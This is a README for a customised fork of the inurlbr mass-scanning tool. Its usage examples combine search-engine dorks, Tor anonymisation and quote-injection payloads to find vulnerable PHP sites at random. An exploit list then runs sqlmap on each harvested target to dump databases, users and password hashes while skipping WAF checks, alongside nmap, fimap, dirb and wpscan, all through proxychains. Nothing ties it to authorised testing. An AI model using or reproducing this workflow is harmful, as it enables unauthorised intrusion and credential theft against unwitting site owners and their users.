# PWR_inurlbr

- added sqllite db logging
- --custom-blacklist
- --custom-config


Example usage:

./inurlbr.php  --dork 'inurl:.php?id=' --custom-config K00B404.conf -s maart2018.lst --tor-random  --mp 1 -q 1,2,3,4,5,6,7 --exploit-vul-id 1,2,3,5,15,4 --exploit-get "'0x27%27"  --custom-blacklist '.fleurlis.,.katun.,.alphaone.,.katun.me,.bible-history.'

Using a dork list and 10 pages of every searchengine (23) do:

./inurlbr.php  --dork-file 'Dorks/dorks2017-prefixed.lst' --custom-config K00B404.conf -s maart2018.lst --tor-random  --mp 10 -q all --exploit-vul-id 1,2,3,5,15 --exploit-get "'0x27%27"  --custom-blacklist '.fleurlis.,.katun.,.alphaone.,.katun.me,.bible-history.'


for list of --exploit-vul-id options which you can add if you like

./inurlbr.php --custom-config K00B404.conf --exploit-list

    [0] => TYPE::COMMAND
    [1] => MKDIR::service tor restart && mkdir -p output/_TARGET_
    [2] => DIG::proxychains dig -4 _TARGET_ > "output/_TARGET_/dig_output.lst" | cat "output/_TARGET_/dig_output.lst"
    [3] => GEOLOCATE::echo _TARGET_ >  "output/_TARGET_/ip_geo.txt" && geoiplookup _TARGETIP_ >> "output/_TARGET_/ip_geo.txt" |cat "output/_TARGET_/ip_geo.txt"
    [4] => SQLMAP::proxychains sqlmap -u "_TARGETFULL_" --dbms mysql --hex --output-dir "output/" --passwords --users --threads 10 --tables --dbs --skip-waf --random-agent --level 2 --risk 3 --batch --retries=1 --timeout 10 --smart --is-dba --dump
    [5] => NMAP::proxychains nmap -F -n -Pn -vvv --open _TARGETIP_ > "output/_TARGET_/nmap_output.lst" |cat  "output/_TARGET_/nmap_output.lst"
    [6] => WPSCAN::wpscan --url "http://"_TARGET_  --batch
    [7] => NMAP::proxychains nmap -n -Pn -vvv --open -p 81,8001,8081 _TARGETIP_ -sV > "output/_TARGET_/nmap_output.lst" |cat "output/_TARGET_/nmap_output.lst"
    [8] => NMAP::proxychains nnmap -vv _TARGETIP_ | grep "Discovered open port" | awk {'print $6":"$4'} | awk -F/ {'print $1'} > "output/_TARGET_/nmap_ip_port_output.lst" |cat "output/_TARGET_/nmap_ip_port_output.lst"
    [9] => SQLMAP::proxychains sqlmap -u "_TARGETFULL_" --dbms mysql --is-dba --users --passwords --skip-waf --random-agent --level 1 --risk 1 --batch --retries=1 --smart --output-dir="output/"
    [10] => NMAP::proxychains nmap -n -Pn -vvv --open --top-ports 10 _TARGETIP_ -sV
    [11] => FIMAP::proxychains fimap -u "http://_TARGET_" -4 -w "output/fimap__TARGET__found_urls.lst" -d 3 >> "output/_TARGET_/fimap_output.lst" |cat "output/_TARGET_/fimap_output.lst"
    [12] => DIRB::proxychains dirb "http://"_TARGET_ |grep "200" > "output/_TARGET__dirb_output.lst" |cat "output/_TARGET__dirb_output.lst"
    [13] => BLACKWIDOW::echo "BLACKWIDOW RUNNING" && proxychains blackwidow -l 1  -u "_TARGETFULL_" -d "_TARGET_" -s "output/_TARGET_/blackwidow_output.lst"
    [14] => SPIDER::echo "SPIDER SCRIPT" && python "modules/crawl.py" --verbose --max-urls=10 --max-time 3 -d 4 "http://"_TARGET_
    [15] => PORTTODB::bash Commands.sh _TARGET_

